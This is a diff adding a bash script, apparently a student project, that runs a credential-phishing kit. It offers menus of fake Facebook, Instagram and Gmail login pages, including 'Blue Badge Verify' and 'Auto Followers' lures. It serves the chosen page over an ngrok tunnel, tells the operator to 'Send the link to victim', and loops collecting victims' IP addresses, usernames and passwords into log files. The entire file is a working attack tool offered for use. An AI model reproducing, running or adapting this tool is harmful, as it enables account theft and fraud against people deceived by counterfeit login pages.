@@ -1,0 +1,367 @@
+#!/bin/bash
+
+trap 'printf "\n";stop;exit 1' 2
+trap user_interrupt SIGINT
+trap user_interrupt SIGTSTP
+
+user_interrupt(){
+        printf "\n"
+        printf "\t CTRL + C Pressed !!\n"
+        sleep 2
+        printf "\n"
+        printf "  Thanks for Using This Tool !!"
+        printf "\n"
+        exit 1
+}
+
+stop() {
+
+checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+checkssh=$(ps aux | grep -o "ssh" | head -n1)
+if [[ $checkngrok == *'ngrok'* ]]; then
+pkill -f -2 ngrok > /dev/null 2>&1
+killall ngrok > /dev/null 2>&1
+fi
+if [[ $checkphp == *'php'* ]]; then
+pkill -f -2 php > /dev/null 2>&1
+killall php > /dev/null 2>&1
+fi
+if [[ $checkssh == *'ssh'* ]]; then
+pkill -f -2 ssh > /dev/null 2>&1
+killall ssh > /dev/null 2>&1
+fi
+if [[ -e .nexlink ]]; then
+rm -rf .nexlink
+fi
+
+}
+
+reqs() {
+
+command -v php > /dev/null 2>&1 || { printf "\n Packages are not Installed ! type - bash setup\n\n"; exit 1; }
+command -v curl > /dev/null 2>&1 || { printf "\n Packages are not Installed ! type - bash setup\n\n"; exit 1; }
+command -v ssh > /dev/null 2>&1 || { printf "\n Packages are not Installed ! type - bash setup\n\n"; exit 1; }
+command -v unzip > /dev/null 2>&1 || { printf "\n Packages are not Installed ! type - bash setup\n\n"; exit 1; }
+
+if [[ -d .htr ]]; then
+printf ""
+else
+printf "\n Packages are not Found ! type- bash setup\n\n"
+exit 1 
+fi
+
+if [[ -d .Modules ]]; then
+printf ""
+else
+printf "\n Packages are not Found ! type - bash setup\n\n"
+exit 1 
+fi
+
+if [[ -d .htr/www ]]; then
+rm -rf .htr/www
+mkdir .htr/www
+else
+mkdir .htr/www
+fi
+
+}
+banner() {
+
+clear
+printf "***********************************************************\n"
+printf "        ***    ******         *  *******   \n"
+printf "      *        *   *          *       *    \n"
+printf "    *    ***   *  *           *      *     \n"
+printf "    *       *  ***     *****  *     *      \n"
+printf "      *    *   *  *           *    *       \n"
+printf "        ***    *    *         *   *        \n"
+printf "   PHISHING TOOL - A Project By Grp-17 \n"
+printf "***********************************************************\n"
+}
+
+smallbanner() {
+clear
+printf "***********************************************************\n"
+printf "\tPhishing Tool made by - \n"
+printf "\t   Rishi Rajpal 19BCY10027\n"
+printf "\t   Sripathi 19BCY10123\n"
+printf "\t   Shivam Agrawal 19BCY10140\n"
+printf "\t   Krishna Agrawal 19BCY10177\n"
+printf "\t   Students of VIT Bhopal University.\n"
+printf "***********************************************************\n"
+
+}
+
+menu() {
+
+printf "      [::]  Select Any Attack for Your Victim  [::]\e[0m\n"
+printf "\n"
+printf " [1] Facebook    \t       [99] About\e[0m\n"
+printf " [2] Instagram   [0] Exit\e[0m\n"
+printf " [3] Google      "
+	
+
+printf "\n"
+read -p $'  Select an option: ' menu_option
+
+if [[ $menu_option == 1 || $menu_option == 01 ]]; then
+facebook
+elif [[ $menu_option == 2 || $menu_option == 02 ]]; then
+instagram
+elif [[ $menu_option == 3 || $menu_option == 03 ]]; then
+gmail
+tunnel_menu
+elif [[ $menu_option == 99 ]]; then
+about
+elif [[ $menu_option == 0 || $menu_option == 00 ]]; then
+printf "\n"
+printf "  Thanks for Using This Tool !!"
+printf "\n"
+exit 1
+
+else
+printf "\n\n  Invalid option \n"
+sleep 1
+banner
+menu
+fi
+
+}
+
+facebook(){
+printf " \n"
+printf " [1] Traditional Login Page\n"
+printf " [2] Advanced Voting Poll Login Page\n"
+printf " [3] Fake Security Login Page\n"
+printf " [4] Facebook Messenger Login Page\n"
+printf "\n"
+read -p $'  Select an option: ' fb_option
+
+
+if [[ $fb_option == 1 || $fb_option == 01 ]]; then
+website="facebook"
+tunnel_menu
+elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
+website="fb_advanced"
+tunnel_menu
+elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
+website="fb_security"
+tunnel_menu
+elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
+website="fb_messenger"
+tunnel_menu
+
+else
+printf "\n\n   Invalid option \n"
+sleep 1
+banner
+menu
+fi
+
+}
+instagram(){
+printf " \n"
+printf " [1] Traditional Login Page\n"
+printf " [2] Auto Followers Login Page\n"
+printf " [3] Blue Badge Verify Login Page\n"
+printf "\n"
+read -p $'  Select an option: ' ig_option
+
+
+if [[ $ig_option == 1 || $ig_option == 01 ]]; then
+website="instagram"
+tunnel_menu
+elif [[ $ig_option == 2 || $ig_option == 02 ]]; then
+website="ig_followers"
+tunnel_menu
+elif [[ $ig_option == 3 || $ig_option == 03 ]]; then
+website="ig_verify"
+tunnel_menu
+
+else
+printf "\n\n  Invalid option!! \n"
+sleep 1
+banner
+menu
+fi
+
+}
+gmail(){
+printf " \n"
+printf " [1] Gmail Old Login Page\n"
+printf " [2] Gmail New Login Page\n"
+printf " [3] Advanced Voting Poll\n"
+printf "\n"
+read -p $'  Select an option: ' gmail_option
+
+
+if [[ $gmail_option == 1 || $gmail_option == 01 ]]; then
+website="google"
+tunnel_menu
+elif [[ $gmail_option == 2 || $gmail_option == 02 ]]; then
+website="google_new"
+tunnel_menu
+elif [[ $gmail_option == 3 || $gmail_option == 03 ]]; then
+website="google_poll"
+tunnel_menu
+
+else
+printf "\n\n  Invalid option \n"
+sleep 1
+banner
+menu
+fi
+
+}
+
+
+about() {
+
+banner
+smallbanner
+
+printf " [00] Home          [99] Exit\n"
+printf "\n"
+read -p $'  Select an option: ' about_option
+
+if [[ $about_option == 0 || $about_option == 00 ]]; then
+sleep 1
+banner
+menu
+elif [[ $about_option == 99 ]]; then
+sleep 1
+printf "\n"
+printf "  Thanks for Using This Tool !!  \n"
+printf "\n"
+exit 1
+
+else
+printf "\n\n  Invalid option \n"
+sleep 1
+banner
+menu
+fi
+}
+
+tunnel_menu() {
+
+if [[ -e .nexlink ]]; then
+rm -rf .nexlink
+fi
+
+if [[ -d .htr/www ]]; then
+rm -rf .htr/www
+mkdir .htr/www
+else
+mkdir .htr/www
+fi
+
+cp -rf .Modules/$website/* .htr/www
+cp -f .Modules/ip.php .htr/www/
+
+def_tunnel_menu="2"
+smallbanner
+printf " Available Port-Forwading Options - "
+printf "[1] Ngrok\n"
+printf "\n"
+read -p $'  Select a Port Forwarding option: ' tunnel_menu
+tunnel_menu="${tunnel_menu:-${def_tunnel_menu}}"
+
+
+if [[ $tunnel_menu == 1 || $tunnel_menu == 01 ]]; then
+start_ngrok
+
+else
+printf "\n\n  Invalid option !! \n"
+sleep 1
+banner
+menu
+fi
+
+}
+
+
+
+start_ngrok() {
+
+printf "\n"
+printf "  Initializing... http://127.0.0.1:5555 \n"
+sleep 1
+printf "\n"
+printf "  Launching Ngrok ...\n"
+cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
+sleep 2
+./.htr/ngrok http 127.0.0.1:5555 > /dev/null 2>&1 &
+sleep 7
+ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+
+smallbanner
+printf "\n"
+printf "  Send the link to victim : %s \n" $ngrok_link
+
+datafound
+}
+
+grab_ip() {
+
+ip=$(grep -a 'IP:' .htr/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+
+printf "\n"
+printf "  Victim IP: %s " $ip
+printf "\n"
+printf "  Saved: ip.txt\n" $server
+printf "\n"
+cat .htr/www/ip.txt >> ip.txt
+
+}
+
+grab_creds() {
+
+account=$(grep -o 'Username:.*' .htr/www/usernames.txt | cut -d " " -f2)
+IFS=$'\n'
+password=$(grep -o 'Pass:.*' .htr/www/usernames.txt | cut -d ":" -f2)
+printf "\n"
+printf "  Account: %s" $account
+printf "\n"
+printf "  Password: %s" $password
+cat .htr/www/usernames.txt >> logs/$website.log
+printf "\n"
+printf "  Saved: logs/%s.log" $website
+printf "\n"
+printf "  Waiting for Next Login Info, Ctrl + C to exit.\n"
+
+}
+
+datafound() {
+
+printf "\n"
+printf "  Waiting for Login Info, Ctrl + C to exit.\n"
+printf "\n"
+while [ true ]; do
+
+
+if [[ -e ".htr/www/ip.txt" ]]; then
+printf "\n"
+printf "  Victim IP Found !\n"
+grab_ip
+rm -rf .htr/www/ip.txt
+fi
+sleep 0.75
+if [[ -e ".htr/www/usernames.txt" ]]; then
+printf "\n"
+printf "  Login info Found !!\n"
+grab_creds
+rm -rf .htr/www/usernames.txt
+fi
+sleep 0.75
+
+
+done 
+
+}
+
+banner
+reqs
+menu
